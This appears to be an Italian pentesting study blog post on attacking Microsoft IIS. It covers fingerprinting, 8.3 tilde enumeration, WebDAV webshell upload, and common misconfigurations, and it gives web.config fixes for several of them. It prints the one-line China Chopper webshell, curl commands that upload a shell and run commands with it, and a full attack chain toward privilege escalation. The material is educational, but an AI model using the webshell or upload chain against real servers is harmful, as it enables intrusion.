---
title: "IIS Web Server Attacks"
date: 2026-09-14 12:00:00 +0100
categories: [PT1, 3-web-app]
tags: [iis, webdav, aspx, fingerprinting, tilde-enumeration, misconfigurations]
description:  IIS Fingerprinting, Enumeration e Exploitation
---

## Introduzione: IIS come bersaglio di pentesting

**IIS** (Internet Information Services) è il web server ufficiale di Microsoft — l'equivalente di Apache o Nginx nel mondo Windows.

> Se un'azienda usa server Windows per far girare siti interni, portali aziendali, o API, è molto probabile che ci sia IIS dietro, semplicemente perché è l'opzione di default, già integrata nel sistema operativo.
{: .prompt-tip }

A differenza di Apache/Nginx (che gestiscono principalmente richieste HTTP), IIS è profondamente integrato nell'ecosistema Windows aziendale, con accesso diretto a:

- **Windows Authentication** — autenticazione tramite il sistema operativo stesso
- **Active Directory** — il registro centralizzato di utenti e permessi aziendali
- **.NET runtime** — il framework principale per app web Windows

Questo significa che compromettere IIS non è "solo" ottenere accesso a un sito web — potrebbe essere il primo passo per accedere all' intera rete aziendale, specialmente se il server gira sotto un account privilegiato.

> IIS è considerato un bersaglio ad "alto valore" proprio per questo — è una porta d'ingresso potenziale verso l'infrastruttura Windows più ampia, non una risorsa isolata.
{: .prompt-danger }



## 1. IIS Fingerprinting and Enumeration

La versione determina **quali CVE si applicano**. Il metodo più rapido è ispezionare gli header della risposta HTTP con:

```bash
curl -I http://target
> HTTP/1.1 200 OK
> Server: Microsoft-IIS/10.0
> X-Powered-By: ASP.NET
```

L'header `Server: Microsoft-IIS/10.0` ci dice che la versione è IIS 10.0 (Windows Server 2016/2019/2022). Versioni obsolete sono vulnerabili a CVE pubblici per cui non verrà mai rilasciata una patch.


## 2. IIS Tilde Enumeration (Formato 8.3)

Per capire questa tecnica andiamo indietro nel tempo. DOS (il sistema operativo che ha preceduto Windows, anni '80) aveva un limite tecnico: i nomi dei file potevano avere al massimo 8 caratteri, più un'estensione di al massimo 3 caratteri — da qui il nome "formato 8.3" (es. DOCUME~1.TXT). Windows moderno permette nomi molto più lunghi (Documento_Finale_2026.txt), ma per compatibilità con software vecchio che si aspetta ancora quel formato, Windows genera automaticamente, per ogni file che crei, anche una versione "corta" del nome — parallela a quella lunga, nascosta ma sempre presente sul disco. La regola di generazione del nome breve è la seguente.

1. Prendiamo i primi 6 caratteri del nome lungo
2. Aggiungiamo `~1` (o `~2`, `~3`... se c'è collisione)
3. Mantieniamo i primi 3 caratteri dell'estensione

**Esempi**:

- `BackupFiles` → `BACKUP~1`
- `AdminPortal` → `ADMINI~1`
- `users_backup.xlsx` → `USERS_~1.XLS`

Da questo comportamento di default nasce una vulnerabilità: IIS riconosce questi nomi brevi negli URL, e quando richiediamo `http://target/BACKUP~1/`, il server risponde in modo **leggermente diverso** rispetto a quando richiediamo `http://target/ZZZZZZ~1/`. In particolare, se il nome breve esiste il server risponde con `404`, mentre se non esiste avremo un errore `400`. Queste differenze sottili permettono a uno strumento automatico (come *iis_shortname_scan.py*) di **ricostruire i nomi, carattere per carattere**, senza usare una wordlist.

```bash
python3 iis_shortname_scan.py http://target/
>[+] Directory /aspnet~1    [Done]
>[+] Directory /backup~1    [Done]
```

Da qui, possiamo dedurre che esistono cartelle come `AspNet*` e `Backup*` — comunemente `AspNetClient` e `BackupFiles`. Una volta trovato il nome breve, accediamo direttamente:

```bash
curl http://target/BackupFiles/
```

Spesso troverai file di backup, note di configurazione, o credenziali lasciate accidentalmente.

> **Caso reale**: un amministratore ha lasciato le credenziali WebDAV in `/BackupFiles/webdav_notes.txt`, accessibile senza autenticazione.
{: .prompt-warning }


## 3. WebDAV Exploitation

**WebDAV** (Distributed Authoring and Versioning) è un'estensione HTTP che aggiunge metodi per modificare file da remoto:

- `PUT` — carica un file
- `DELETE` — elimina un file
- `MKCOL` — crea una cartella
- `PROPFIND` — elenca file e cartelle
- `MOVE` — sposta/rinomina un file

Se lasciato abilitato su una directory con permessi di scrittura ed esecuzione di script, diventa un percorso diretto per caricare una shell eseguibile. Per verificare se WebDAV è abilitato eseguiamo:

```bash
curl -X OPTIONS http://target -sv 2>&1 | grep -E "Allow:|DAV:"
< Allow: OPTIONS, TRACE, GET, HEAD, POST, PUT, DELETE, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
< DAV: 1, 2
```
Allow: — è l'header di risposta che elenca i metodi HTTP supportati (GET, POST, PUT, DELETE, ...) — esattamente quello che cercavamo nel messaggio precedente per capire se WebDAV è attivo
DAV: — è un header specifico di WebDAV, che indica il livello di conformità al protocollo supportato dal server (es. DAV: 1, 2) — la sua sola presenza conferma che WebDAV è attivo, indipendentemente da cosa dice Allow. Vedere PUT, DELETE, MKCOL, PROPFIND nell'elenco di Allow:, insieme all'header DAV: presente, è la conferma diretta che il server accetta upload/modifica di file via WebDAV




Grazie a WebDAV potremmo voler provare a caricare una webshell sul server. Affinchè il caricamento e la sua esecuzione siano fattibili, le seguenti condizioni devono essere verificate:


| Condizione | Cos'è | Conseguenza se manca |
|---|---|---|
| WebDAV abilitato | L'header `DAV:` è presente | Non puoi caricare file |
| Credenziali valide | Utente con permessi di scrittura | Upload viene rifiutato con `401` |
| Esecuzione script abilitata | L'handler IIS esegue `.aspx` | Il file viene scaricato, non eseguito |

Sapere che WebDAV è abilitato non è sufficiente. È necessario sapere se è possibile caricare file e, soprattutto, se i file caricati vengono eseguiti. Il procedimento è semplice: caricare un file di prova e osservare la risposta.  Di seguito abbiamo creato una shell in un file cmd.aspx e abbiamo eseguito:

```bash
# Caricare il file con autenticazione NTLM
curl -v --ntlm -u 'webdav_user:password' -T cmd.aspx http://target/webdav/cmd.aspx

# Verificare che viene eseguito
curl "http://target/webdav/cmd.aspx?cmd=whoami"
> iis apppool\defaultapppool
```


Abbiamo ottenuto *esecuzione di comandi remota (RCE)* — il primo passo di un vero attacco. Se l'output fosse `nt authority\system` o il nome di un amministratore di dominio, saresti già "salito di privilegi" — grande sfiga per il server, grande fortuna per te.

Possiamo poi passare da una shell limitata come quella descritta sopra a una vera reverse shell.

>Nel mondo reale, gli attaccanti usano **China Chopper** — una webshell di soli **73 byte**:
>```csharp
><%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
>```
>
> Caratteristiche:
>- **Minuscola** — sfugge ai controlli di sicurezza che cercano "file sospetti grandi"
>- **Generica** — esegue **qualsiasi codice .NET** mandato dal parametro `chopper`, non solo comandi fissi
>I sistemi di sicurezza la cercano cercando il pattern `eval(` dentro file `.aspx`, ma è comunque in uso perché difficile da bloccare completamente.


## 5. IIS Misconfigurations

Le configurazioni errate sono la **superficie di attacco più comune** contro IIS. Non richiedono CVE — sono semplici errori umani.

### Errore 1: Directory Listing Abilitato

Quando IIS non ha un file "default" in una cartella (es. `index.html`, `default.aspx`) e il "Directory Listing" è attivo, mostra l'elenco dei file. Il rischio è che i file di backup, le configurazioni, i dati caricati diventano pubblicamente visibili.

*Esempio*:

```bash
curl http://target/uploads/
> <html><head><title>MACHINE_IP - /uploads/</title></head><body><H1>MACHINE_IP - /uploads/</H1><hr>
> <pre><A HREF="/">[To Parent Directory]</A><br><br>
> 4/13/2026 2:25 PM 31 <A HREF="/uploads/config.bak">config.bak</A><br>
> 4/13/2026 2:25 PM 168 <A HREF="/uploads/web.config">web.config</A><br>
> </pre><hr></body></html>
```

### Errore 2: PUT e DELETE senza autenticazione

Il problema è lo stesso che abbiamo visto con WebDAV, ma applicato *globalmente* al sito. Controlliamo con:

```bash
curl -X OPTIONS http://target/ -sv 2>&1 | grep "Allow:"
```

Se `PUT` o `DELETE` sono nell'elenco senza richiedere autenticazione, chiunque può caricare/cancellare file.

### Errore 3: Esposizione di web.config

Il file `web.config` contiene la **configurazione intera** dell'app, spesso incluse credenziali di database. Tipicamente contiene stringhe di connessione al database, API key, percorsi interni. Il fatto che sia visibile è molto grave. Controlliamo con:

```bash
curl http://target/web.config
```

Se una risposta `200` restituisce XML che inizia con `<configuration>`, abbiamo trovato un grosso problema.

### Errore 4: Messaggi di errore dettagliati

Quando un programma web incontra un errore (es. cerca un dato nel database e non lo trova, o riceve un input che non si aspettava), deve rispondere in qualche modo. Ci sono due modi opposti di gestirlo:

Modo "sviluppatore": mostra tutti i dettagli tecnici dell'errore — utile mentre stai scrivendo il codice, perché ti aiuta a capire immediatamente dove hai sbagliato
Modo "produzione": mostra un messaggio generico tipo "Si è verificato un errore, riprova più tardi" — nasconde i dettagli agli utenti finali, perché quei dettagli non servono a loro e possono essere pericolosi se resi pubblici

Il problema descritto qui: alcuni server IIS restano configurati nel primo modo anche quando sono già online e raggiungibili da chiunque — cioè restano "in modalità sviluppo" per errore, dimenticanza.
Ecco cosa vedremmo concretamente se capita:

```
C:\inetpub\wwwroot\App\Controllers\AccountController.cs (linea 42)
.NET Framework 4.8.0.0
SELECT * FROM users WHERE id = @id (la query che ha causato l'errore)
```

Per correggere questo comportamento ed evitare che questi dati siano visibili dall'esterno dobbiamo modificare il file `web.config`con:

```xml
<system.web>
  <customErrors mode="On" />
</system.web>
```



### Errore 5: trace.axd Abilitato

ASP.NET (il framework .NET per app web, che gira dentro IIS come avevamo visto nel diagramma) include uno strumento di debug integrato (trace.axd), pensato per aiutare lo sviluppatore a vedere cosa sta succedendo dentro l'applicazione mentre la sta scrivendo — un po' come un "registratore" che tiene traccia delle ultime richieste ricevute e di tutti i loro dettagli interni.

Quando questo strumento è attivo, basta visitare un indirizzo specifico per vederne il contenuto:

```bash
curl http://target/trace.axd
```

Se la risposta è `200` (non `404`), è accessibile. In questo caso, i file esposti più pericolosi sono i cookie di autenticazione di utenti con alti privilegi (trovabili nel file di log).


Per correggere questo comportamento modifichiamo il file web.config con:

```xml
<trace enabled="false"/>
```


### Errore 6: Metodo TRACE Abilitato

Nonostante il nome simile al messaggio precedente, sono due cose completamente diverse: trace.axd era una pagina specifica di ASP.NET che mostra un log delle richieste passate; TRACE è invece un metodo HTTP generico, che esiste a prescindere da ASP.NET, gestito direttamente dal server web. TRACE è un metodo HTTP, meno comune, con uno scopo molto specifico: quando lo usiamo, il server non ci restituisce contenuto normale — ci rispedisce indietro esattamente la richiesta che gli abbiamo appena mandato, così com'è, come un'eco.

> TRACE serve a verificare che il messaggio sia arrivato integro, senza essere stato modificato lungo il tragitto (utile in teoria per capire se, tra client e server, qualche dispositivo intermedio come un proxy sta alterando le richieste). Questo era lo scopo originale, pensato per diagnostica tecnica — non per l'uso quotidiano di un sito web.
{: .prompt-tip }

Il metodo dovrebbe rimanere disabilitato all'utente, per evitare rischi di Cross-Site Tracing (XST).

>Cross-Site Tracing (XST) è un attacco che sfrutta TRACE in combinazione con un'altra vulnerabilità (il Cross-Site Scripting, XSS — quando un attaccante riesce a far eseguire codice malevolo nel browser di una vittima, dentro un sito legittimo). L'idea, in parole semplici: normalmente i cookie protetti con il flag HttpOnly non possono essere letti da JavaScript nel browser (è proprio una protezione contro il furto di cookie via XSS). Ma se TRACE è attivo, uno script malevolo può mandare una richiesta TRACE al server, e il server — rispondendo con l'eco della richiesta — include anche gli header che il browser ha allegato automaticamente, cookie compreso. In questo modo lo script malevolo "vede" il cookie indirettamente, aggirando la protezione HttpOnly.

Possiamo controllare se il metodo è attivo con:

```bash
curl -X TRACE http://target -sv
```

- Risposta `200` con la richiesta ripetuta nel body → **vulnerabile**
- Risposta `405 Method Not Allowed` → **corretto**


### Errore 7: Application Pool con privilegi troppo alti

Consideriamo il contesto di prima, in cui abbiamo caricato una web shell e abbiamo eseguito:

```bash
curl "http://target/webdav/cmd.aspx?cmd=whoami"
# Output: iis apppool\defaultapppool
```

Questo output — iis apppool\defaultapppool — è esattamente il caso "normale e sicuro" di cui parla questo punto, perchè ha privilegi limitati, così che se un attaccante ottiene esecuzione di comandi (come abbiamo fatto con la webshell), non ottiene automaticamente il controllo completo del server.
Se l'output fosse `nt authority\system` o un account **amministratore di dominio**, significherebbe che l'amministratore ha configurato l'app pool per girare sotto un account potentissimo.

A volte, chi amministra il server configura manualmente l'application pool per girare con un account molto più potente del normale — tipicamente per pigrizia o per risolvere in fretta un problema pratico: ad esempio, l'app ha bisogno di leggere file da una cartella condivisa in rete, o di accedere a un database, e l'account normale (DefaultAppPool) non ha i permessi per farlo. Invece di configurare correttamente i permessi specifici necessari, l'amministratore "semplifica" dando all'intero application pool un account potentissimo — SYSTEM (il livello di privilegio più alto possibile su Windows, superiore persino ad amministratore), Administrator, o addirittura un account amministratore dell'intero dominio Active Directory aziendale.
La conseguenza è che se qualcuno compromettesse l'app, avrebbe già il controllo totale del server, senza bisogno di privilege escalation.



## Flusso di un Pentesting IIS Completo
 Vediamo un flusso di pentesting completo con alcuni tool di automazione (nmap e iis_shortname_scan.py).


```
1. curl -I http://target
   ↓ Ottieni Server: Microsoft-IIS/10.0
   NMAP: nmap -sV -p 80 target
   ↓ Stesso risultato: Server VERSION nell'output di -sV

2. curl -X OPTIONS http://target
   ↓ Vedi Allow: PUT, DELETE (WebDAV è attivo?)
   NMAP: nmap --script http-methods -p 80 target
         nmap --script http-webdav-scan -p 80 target
   ↓ http-methods elenca i metodi; http-webdav-scan conferma DAV nello specifico

3. curl http://target/uploads/  (directory listing?)
   curl http://target/web.config (configurazione esposta?)
   curl http://target/trace.axd (debug handler attivo?)

4. python3 iis_shortname_scan.py http://target/
   ↓ Trovi cartelle nascoste come /backup~1

5. curl http://target/Backup/
   ↓ Trovi file: webdav_notes.txt

6. curl http://target/Backup/webdav_notes.txt
   ↓ Estrai credenziali: webdav_user:password

7. curl --ntlm -u 'webdav_user:password' -T shell.aspx http://target/webdav/
   ↓ Carica webshell
   NMAP: nessun equivalente
   ↓ Nmap può confermare che l'autenticazione NTLM è richiesta
     (nmap --script http-ntlm-info -p 80 target), ma non può autenticarsi
     e caricare un file al posto tuo.

8. curl "http://target/webdav/shell.aspx?cmd=whoami"
   ↓ Verifica RCE, identità è iis apppool\defaultapppool

9. whoami → iis apppool\defaultapppool?
   No → Escalazione di privilegi necessaria (Potato exploit, kernel vuln, ecc.)
   Yes → Hai già accesso limitato, ma puoi muoverti lateralmente verso AD

```

---

## Riassunto dei Punti Chiave

| Tecnica | Cosa fa | Rischio |
|---|---|---|
| **Fingerprinting** | Identifica versione IIS | Rivela CVE applicabili |
| **Tilde enumeration** | Scopre cartelle nascoste (formato 8.3) | Bypassa wordlist attacks |
| **WebDAV exploitation** | Carica webshell se tre condizioni allineate | RCE diretto |
| **Misconfigurations** | Sfrutta errori di setup (no autenticazione, debug attivo, ecc.) | Spesso più facile che CVE |
| **Escalazione privilegi** | Da `IIS APPPOOL\DefaultAppPool` a `SYSTEM` o admin di dominio | Accesso totale |

> **Principio fondamentale**: le configurazioni errate sono spesso il percorso più veloce. Non saltare il controllo delle misconfigurations per correre subito agli exploit automatizzati.
{: .prompt-tip }
